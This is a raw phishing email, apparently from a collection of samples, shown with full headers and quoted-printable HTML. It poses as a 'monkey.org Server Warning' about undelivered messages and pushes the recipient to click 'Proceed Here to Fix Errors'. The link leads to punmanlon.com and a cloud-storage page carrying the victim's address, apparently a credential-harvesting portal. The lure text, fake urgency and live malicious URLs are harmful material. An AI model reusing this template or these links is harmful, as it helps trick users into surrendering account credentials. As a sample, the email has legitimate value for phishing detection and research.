@@ -1,0 +1,334 @@
+Return-Path: baba.s@ap.nrrs.net
+Delivered-To: jose@monkey.org
+X-FDA: 78798140358.37.0B81813
+Received: from spamgateway-hq.go4hosting.in (spamgateway-hq.go4hosting.in
+ [49.50.81.120])	by imf10.b.hostedemail.com (Postfix) with ESMTP id
+ 40D23184109BD	for <jose@monkey.org>; Thu, 11 Nov 2021 22:48:38 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+	by spamgateway-hq.go4hosting.in (Postfix) with ESMTP id 83DF078A0F7
+	for <jose@monkey.org>; Fri, 12 Nov 2021 04:08:35 +0530 (IST)
+X-Virus-Scanned: by SpamTitan at go4hosting.in
+Received: from spamgateway-hq.go4hosting.in (localhost [127.0.0.1])
+	by spamgateway-hq.go4hosting.in (Postfix) with ESMTP id D142F789CED
+	for <jose@monkey.org>; Fri, 12 Nov 2021 04:08:29 +0530 (IST)
+Received: from mail.nrrs.net (mail.nrrs.net [49.50.81.64])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by spamgateway-hq.go4hosting.in (Postfix) with ESMTPS id CB648789CE3
+	for <jose@monkey.org>; Fri, 12 Nov 2021 04:08:29 +0530 (IST)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.nrrs.net (Postfix) with ESMTP id 0FBEAC7EE12
+	for <jose@monkey.org>; Fri, 12 Nov 2021 02:29:24 +0530 (IST)
+Received: from mail.nrrs.net ([127.0.0.1])
+	by localhost (mail.nrrs.net [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id oYwxucqjKxMR for <jose@monkey.org>;
+	Fri, 12 Nov 2021 02:29:20 +0530 (IST)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.nrrs.net (Postfix) with ESMTP id 2433CC8C0DA
+	for <jose@monkey.org>; Fri, 12 Nov 2021 00:20:44 +0530 (IST)
+X-Amavis-Modified: Mail body modified (using disclaimer) - mail.nrrs.net
+X-Virus-Scanned: amavisd-new at mail.nrrs.net
+Received: from mail.nrrs.net ([127.0.0.1])
+	by localhost (mail.nrrs.net [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id L3LH7xjon1YD for <jose@monkey.org>;
+	Fri, 12 Nov 2021 00:20:44 +0530 (IST)
+Received: from ap.nrrs.net (ec2-54-89-213-25.compute-1.amazonaws.com
+ [54.89.213.25])	by mail.nrrs.net (Postfix) with ESMTPSA id C00A4C79B39	for
+ <jose@monkey.org>; Thu, 11 Nov 2021 22:55:40 +0530 (IST)
+To: jose@monkey.org
+Subject: monkey.org Server Warning!!!  (4) Pending  undelivered mails for
+ jose@monkey.org
+Date: 11 Nov 2021 17:27:41 +0000
+Message-ID: <20211111172741.977DC3D679A660E0@from.header.has.no.domain>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+From: baba.s@ap.nrrs.net
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: 40D23184109BD
+X-Stat-Signature: 1ysfpehbb9hbsf5pe4qs8k85896witr1
+Authentication-Results: imf10.b.hostedemail.com;	dkim=none;	spf=none
+ (imf10.b.hostedemail.com: domain of baba.s@ap.nrrs.net has no SPF policy when
+ checking 49.50.81.120) smtp.mailfrom=baba.s@ap.nrrs.net;	dmarc=none
+X-Spam-Status: No, score=0.70
+X-HE-Tag: 1636670918-992292
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 91
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<DIV id=3D:24b class=3D"Ar Au Ao" style=3D"DISPLAY: block">
+<DIV spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 aria-label=3D"Message B=
+ody" aria-multiline=3Dtrue id=3D:247 class=3D"Am Al editable LW-avf tS-tW t=
+S-tY" hideFocus contentEditable=3Dtrue style=3D"DIRECTION: ltr; MIN-HEIGHT:=
+ 270px" itacorner=3D"6,7:1,1,0,0" g_editable=3D"true"><BR>
+<table id=3D"m_3880796612183919335m_5865790658961867305gmail-v1gmail-m_-300=
+0622845660801250ydp3f6f441eyiv3409748408m_-7151681835810907747m_67054910097=
+01393519m_-7562529493840046713m_3272650405302131926m_7112594340042853004m_1=
+367512448937311978m_-9106880383765710150m_2242391237262962342m_204008160251=
+7728463m_227485854341764424m_1677300616864326522m_-3146049488675001751gmail=
+-ko_singleArticleBlock_8_mr_css_attr" style=3D"FONT-SIZE: 13px; FONT-FAMILY=
+: &quot;Segoe UI&quot;,&quot;Lucida Sans&quot;,sans-serif; BORDER-COLLAPSE:=
+=20
+collapse; MIN-WIDTH: 0px; COLOR: rgb(38,40,42); BACKGROUND-COLOR: rgb(238,2=
+36,225); TEXT-INDENT: 0px" cellspacing=3D"0" cellpadding=3D"0" width=3D"100=
+%" bgcolor=3D"#eeece1" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; MIN-WIDTH: 0px; PADDIN=
+G-LEFT: 9px; PADDING-RIGHT: 9px" valign=3D"top" align=3D"center">
+<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
+"0" width=3D"570" align=3D"center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" valign=3D"top" align=3D"center">
+<DIV style=3D"BOX-SIZING: border-box; MAX-WIDTH: 570px; MARGIN: 0px auto">
+<table style=3D"MAX-WIDTH: 570px; WIDTH: 570px; BORDER-COLLAPSE: collapse; =
+BACKGROUND-COLOR: rgb(255,255,255)" cellspacing=3D"2" cellpadding=3D"0" wid=
+th=3D"570" bgcolor=3D"#ffffff" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" valign=3D"top" align=3D"center">
+<DIV style=3D"BOX-SIZING: border-box; MAX-WIDTH: 552px; WIDTH: 552px; VERTI=
+CAL-ALIGN: top">
+<table style=3D"WIDTH: 552px; BORDER-COLLAPSE: collapse" cellspacing=3D"5" =
+cellpadding=3D"0" width=3D"552" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: arial,he=
+lvetica,sans-serif; COLOR: rgb(63,63,63)" valign=3D"top" width=3D"100%" ali=
+gn=3D"center"></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: arial,he=
+lvetica,sans-serif; LINE-HEIGHT: normal" valign=3D"top" width=3D"100%" alig=
+n=3D"left"><FONT style=3D"BOX-SIZING: border-box" color=3D#3f3f3f><FONT sty=
+le=3D"BOX-SIZING: border-box" face=3DCandara>Dear&nbsp;</FONT></FONT><FONT =
+color=3D#0000ff>jose</FONT>,&nbsp; </TD></TR></TBODY>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" valign=3D"top" align=3D"center">
+<DIV style=3D"BOX-SIZING: border-box; MAX-WIDTH: 552px; WIDTH: 552px; VERTI=
+CAL-ALIGN: top"><BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZIN=
+G: border-box">
+<table style=3D"WIDTH: 552px; BORDER-COLLAPSE: collapse" cellspacing=3D"9" =
+cellpadding=3D"0" width=3D"552" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: arial,he=
+lvetica,sans-serif; COLOR: rgb(63,63,63)" valign=3D"top" width=3D"100%" ali=
+gn=3D"center"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">S=
+OME INCOMING MESSAGES WERE UNDELIVERED TO INBOX</SPAN></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial,helvetica,sans-seri=
+f; LINE-HEIGHT: normal" valign=3D"top" width=3D"100%" align=3D"left">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; COLOR: rgb(63,63,63); =
+MARGIN: 0px 0px 1em"></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; MARGIN: 1em 0px"><FONT=
+ style=3D"BOX-SIZING: border-box" color=3D#3f3f3f></FONT></P><BR style=3D"B=
+OX-SIZING: border-box"><FONT size=3D2><FONT style=3D"BOX-SIZING: border-box=
+" color=3D#3f3f3f face=3DCandara><SPAN style=3D"BOX-SIZING: border-box; MAR=
+GIN: 1em 0px">Due to an IMAP&nbsp;and POP3 settings error on your E-mail,&n=
+bsp;</SPAN></FONT>&nbsp; <SPAN style=3D'FONT-FAMILY: "Segoe UI",Helvetica,A=
+rial,sans-serif; COLOR: rgb(0,0,0); TEXT-ALIGN: center'>[</SPAN>
+ <SPAN style=3D'FONT-FAMILY: "Segoe UI",Helvetica,Arial,sans-serif; COLOR: =
+rgb(0,0,0); TEXT-ALIGN: center'>[-Email-]]</SPAN>&nbsp;<FONT style=3D"BOX-S=
+IZING: border-box" color=3D#3f3f3f face=3DCandara>&nbsp;incoming messages w=
+ere delayed.</FONT><BR></FONT><FONT style=3D"BOX-SIZING: border-box" color=
+=3D#3f3f3f face=3DCandara><FONT size=3D2><BR style=3D"BOX-SIZING: border-bo=
+x">Log on to&nbsp; <SPAN style=3D'FONT-FAMILY: "Segoe UI",Helvetica,Arial,s=
+ans-serif; COLOR: rgb(0,0,0); TEXT-ALIGN: center'>jose@monkey.org</SPAN>
+ &nbsp;&nbsp;&nbsp;Portal to recover your delay messages.</FONT><BR style=
+=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px">&nbsp;</DIV></FONT><=
+/TD></TR></TBODY></TABLE>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px" bgcolor=3D"#ffffff" align=3D"left">=
+<BR style=3D"BOX-SIZING: border-box">
+<table style=3D"BORDER-COLLAPSE: collapse; PADDING-TOP: 4px" cellspacing=3D=
+"0" cellpadding=3D"6" align=3D"left" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: arial,he=
+lvetica,sans-serif; COLOR: rgb(238,236,225); PADDING-BOTTOM: 6px; TEXT-ALIG=
+N: center; PADDING-TOP: 6px; PADDING-LEFT: 18px; PADDING-RIGHT: 18px; BACKG=
+ROUND-COLOR: rgb(38,38,38)" bgcolor=3D"#262626" valign=3D"middle" align=3D"=
+left"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">
+<A style=3D"BOX-SIZING: border-box; FONT-WEIGHT: normal; COLOR: rgb(238,236=
+,225); BACKGROUND-COLOR: transparent; text-decoration-line: none" href=3D"h=
+ttps://punmanlon.com/dd/updte.html#jose@monkey.org" rel=3Dnoreferrer target=
+=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ry=
+tusvydi.s3.us-east.cloud-object-storage.appdomain.cloud/undefinedUpdate21.h=
+tml%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1636672176238000&amp=
+;usg=3DAFQjCNHHAU4P1alwULzhSTJeKsobZFo5ZA">
+<FONT style=3D"BOX-SIZING: border-box" face=3DCandara>Proceed Here to Fix E=
+rrors</FONT></A></SPAN></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>=
+</DIV></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></DIV></TD>=
+</TR></TBODY></TABLE>
+<table id=3D"m_3880796612183919335m_5865790658961867305gmail-v1gmail-m_-300=
+0622845660801250ydp3f6f441eyiv3409748408m_-7151681835810907747m_67054910097=
+01393519m_-7562529493840046713m_3272650405302131926m_7112594340042853004m_1=
+367512448937311978m_-9106880383765710150m_2242391237262962342m_204008160251=
+7728463m_227485854341764424m_1677300616864326522m_-3146049488675001751gmail=
+-ko_textBlock_9_mr_css_attr" style=3D"FONT-SIZE: 13px; FONT-FAMILY: &quot;S=
+egoe UI&quot;,&quot;Lucida Sans&quot;,sans-serif; BORDER-COLLAPSE:=20
+collapse; MIN-WIDTH: 0px; TEXT-ALIGN: left; TEXT-INDENT: 0px" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=3D"#eeece1" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; MIN-WIDTH: 0px; PADDIN=
+G-LEFT: 9px; PADDING-RIGHT: 9px" valign=3D"top" align=3D"center">
+<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
+"0" width=3D"570" align=3D"center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" valign=3D"top" align=3D"center">
+<DIV style=3D"BOX-SIZING: border-box; MAX-WIDTH: 570px; MARGIN: 0px auto">
+<table style=3D"MAX-WIDTH: 570px; WIDTH: 570px; BORDER-COLLAPSE: collapse; =
+BACKGROUND-COLOR: rgb(255,255,255)" cellspacing=3D"15" cellpadding=3D"0" wi=
+dth=3D"570" bgcolor=3D"#ffffff" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial,helvetica,sans-seri=
+f; LINE-HEIGHT: normal" valign=3D"top" width=3D"100%" align=3D"left">
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 1em"><FONT style=3D"BOX=
+-SIZING: border-box" color=3D#3f3f3f><FONT style=3D"BOX-SIZING: border-box"=
+ face=3DCandara><BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZIN=
+G: border-box"><FONT size=3D2><BR></FONT></FONT></FONT></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 1em"><FONT style=3D"BOX=
+-SIZING: border-box" color=3D#3f3f3f><FONT style=3D"BOX-SIZING: border-box"=
+ face=3DCandara><FONT size=3D2>&nbsp; &nbsp; Find some of the errors being =
+detected by the mail server for&nbsp;</FONT></FONT><FONT size=3D2>&nbsp;</F=
+ONT><FONT style=3D"BOX-SIZING: border-box" color=3D#a78058><FONT style=3D"B=
+OX-SIZING: border-box" size=3D2 face=3DCandara>
+ <SPAN style=3D'FONT-FAMILY: "Segoe UI",Helvetica,Arial,sans-serif; COLOR: =
+rgb(0,0,0); TEXT-ALIGN: center'>jose@monkey.org</SPAN>&nbsp;&nbsp;&nbsp;</F=
+ONT><FONT style=3D"BOX-SIZING: border-box" color=3D#3f3f3f><FONT style=3D"B=
+OX-SIZING: border-box" face=3DCandara><FONT size=3D2>listed below</FONT><SP=
+AN style=3D"FONT-SIZE: 13px">:</SPAN></FONT></FONT></FONT></FONT></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 1em"><FONT style=3D"BOX=
+-SIZING: border-box" color=3D#3f3f3f><FONT style=3D"BOX-SIZING: border-box"=
+ color=3D#a78058><FONT style=3D"BOX-SIZING: border-box" color=3D#3f3f3f><FO=
+NT style=3D"BOX-SIZING: border-box" face=3DCandara><SPAN style=3D"FONT-SIZE=
+: 13px"><BR style=3D"BOX-SIZING: border-box"></SPAN><BR style=3D"BOX-SIZING=
+: border-box"></FONT></FONT></FONT></FONT></P>
+<UL style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; MARGIN-TOP: 0px; COLO=
+R: rgb(63,63,63)">
+<LI style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box"=
+ color=3D#3f3f3f><FONT style=3D"BOX-SIZING: border-box" color=3D#000000 fac=
+e=3DCandara><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><FO=
+NT style=3D"BOX-SIZING: border-box" face=3DCandara>Undelivered to inbox</FO=
+NT></SPAN></FONT></FONT>=20
+<LI style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box"=
+ color=3D#3f3f3f><FONT style=3D"BOX-SIZING: border-box" color=3D#000000 fac=
+e=3DCandara><FONT style=3D"BOX-SIZING: border-box" color=3D#000000 face=3DC=
+andara><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><FONT st=
+yle=3D"BOX-SIZING: border-box" face=3DCandara>Undelivered to inbox</FONT></=
+SPAN></FONT></FONT></FONT>=20
+<LI style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box"=
+ color=3D#3f3f3f><FONT style=3D"BOX-SIZING: border-box" color=3D#000000 fac=
+e=3DCandara><FONT style=3D"BOX-SIZING: border-box" color=3D#000000 face=3DC=
+andara><FONT style=3D"BOX-SIZING: border-box" color=3D#000000 face=3DCandar=
+a><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><FONT style=
+=3D"BOX-SIZING: border-box" face=3DCandara>Undelivered to inbox</FONT></SPA=
+N></FONT></FONT></FONT></FONT>=20
+<LI style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box"=
+ color=3D#3f3f3f><FONT style=3D"BOX-SIZING: border-box" color=3D#000000 fac=
+e=3DCandara><FONT style=3D"BOX-SIZING: border-box" color=3D#000000 face=3DC=
+andara><FONT style=3D"BOX-SIZING: border-box" color=3D#000000 face=3DCandar=
+a><FONT style=3D"BOX-SIZING: border-box" color=3D#3f3f3f><FONT style=3D"BOX=
+-SIZING: border-box" color=3D#a78058><FONT style=3D"BOX-SIZING: border-box"=
+ face=3DCandara><FONT style=3D"BOX-SIZING: border-box" color=3D#000000>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><FONT style=3D"=
+BOX-SIZING: border-box" face=3DCandara>Pending delivery</FONT></SPAN><BR st=
+yle=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"></FONT>=
+</FONT></FONT></FONT></FONT></FONT></FONT></FONT></LI></UL>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; COLOR: rgb(63,63,63); =
+MARGIN: 1em 0px"></P></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 2px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 5px; PADDING-RIGHT: 5px" valign=3D"top">
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center"><SPAN style=3D"BO=
+X-SIZING: border-box; FONT-SIZE: 9px">Copyrights&copy; 2021</SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center"><SPAN style=3D"BO=
+X-SIZING: border-box; FONT-SIZE: 10px"><FONT style=3D"BOX-SIZING: border-bo=
+x" face=3DCandara>
+<A style=3D"BOX-SIZING: border-box; COLOR: rgb(63,63,63); BACKGROUND-COLOR:=
+ transparent; text-decoration-line: none" href=3D"https://crownmachinery.us=
+/" rel=3Dnoreferrer target=3D_blank data-saferedirecturl=3D"https://www.goo=
+gle.com/url?q=3Dhttps://crownmachinery.us/&amp;source=3Dgmail&amp;ust=3D163=
+6672176238000&amp;usg=3DAFQjCNHBUcSXiid79PUmlQo_ma5XyPE0qw">Help &amp; Cont=
+act - Fees - Security - Features&nbsp;</A></FONT></SPAN></DIV></TD></TR></T=
+BODY></TABLE></DIV></TD></TR></TBODY></TABLE>
+<FONT style=3D"BOX-SIZING: border-box" face=3DCandara>
+<DIV id=3Dm_3880796612183919335m_5865790658961867305gmail-v1gmail-m_-300062=
+2845660801250DAB4FAD8-2DD7-40BB-A1B8-4E2AA1F9FDF2_mr_css_attr style=3D"BOX-=
+SIZING: border-box">
+<HR style=3D"BOX-SIZING: content-box; OVERFLOW: visible; HEIGHT: 1px; WIDTH=
+: 341px; COLOR: rgb(144,144,144); BACKGROUND-COLOR: rgb(176,176,176)">
+
+<table style=3D"BORDER-COLLAPSE: collapse">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 3px; PADDING-RIGHT: 5px">
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center">&nbsp;<SPAN style=
+=3D"BOX-SIZING: border-box; FONT-SIZE: x-small; FONT-FAMILY: tahoma,sans-se=
+rif"><FONT style=3D"BOX-SIZING: border-box" size=3D2><SPAN style=3D"BOX-SIZ=
+ING: border-box; FONT-WEIGHT: bolder"><FONT style=3D"BOX-SIZING: border-box=
+" face=3DCalibri><FONT style=3D"BOX-SIZING: border-box" color=3D#a78058>&nb=
+sp;monkey.org</FONT></FONT></SPAN><FONT style=3D"BOX-SIZING: border-box" fa=
+ce=3DCalibri><FONT style=3D"BOX-SIZING: border-box" size=3D2>
+ <FONT style=3D"BOX-SIZING: border-box" face=3DCalibri>&nbsp;&#8226; Email =
+Admin &#8226; secured and encrypted</FONT></FONT></FONT></FONT></SPAN><FONT=
+ style=3D"BOX-SIZING: border-box" size=3D2><FONT style=3D"BOX-SIZING: borde=
+r-box" size=3D2><FONT style=3D"BOX-SIZING: border-box" size=3D2><BR style=
+=3D"BOX-SIZING: border-box; FONT-SIZE: x-small; FONT-FAMILY: tahoma,sans-se=
+rif"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: x-small; FONT-FAMILY=
+: tahoma,sans-serif"><FONT style=3D"BOX-SIZING: border-box" size=3D2></FONT=
+>
+</SPAN>&nbsp;&nbsp;<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: x-smal=
+l; FONT-FAMILY: tahoma,sans-serif"><FONT style=3D"BOX-SIZING: border-box" s=
+ize=3D1><FONT style=3D"BOX-SIZING: border-box" face=3DCalibri>You are recei=
+ving this one-time notification because you created account.</FONT></FONT><=
+/SPAN></FONT></FONT></FONT></DIV><FONT style=3D"BOX-SIZING: border-box" siz=
+e=3D2><FONT style=3D"BOX-SIZING: border-box" size=3D2><FONT style=3D"BOX-SI=
+ZING: border-box" size=3D1></FONT></FONT></FONT></TD></TR></TBODY>
+</TABLE></DIV></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></=
+DIV></DIV>
+<br>=
+<html>=0A
+<style>=0A
+.img-container-block {=0A
+  text-align: left;=0A
+}=0A
+.img-container-inline {=0A
+  text-align: left;=0A
+  display: block;=0A
+}=0A
+</style>=0A
+<body>=0A
+=0A
+<span class=3D"img-container-inline">=0A
+  <img src=3D"https://mail.nrrs.net/skins/_base/logos/cyclepure.GIF" alt=3D"">=0A
+</span>=0A
+=0A
+=0A
+<div class=3D"img-container-block">=0A
+  <p>To know more please visit www.nrrs.com </br>To buy our products online please visit www.cycle.in </br> DISCLAIMER:The information contained in this email or any attachment in it is intended for the exclusive use of the addressee(s) and may contain proprietary, confidential or privileged information. If you are not the intended recipient, you should not distribute or copy this email. Please notify the sender immediately and destroy all copies of this message and its attachments, if any. Please note that intercepting or unauthorized use of this message or its attachment can be treated as infringement of privacy under the Human Rights Act 1993. It is also a Criminal Offense under the Information and Technology Act, 2008. WARNING: Computer viruses can be transmitted via email. The recipient should check this email and any attachments for viruses. The company accepts no liability for any damage caused by any virus transmitted by this email. CAUTION: This email originated from outside
+  of the organization. Do not click links or open attachments unless you recognize the sender and know the content is safe.</p>=0A
+</div>=0A
+</body></html>=0A
+<br>=
+</BODY></HTML>
+
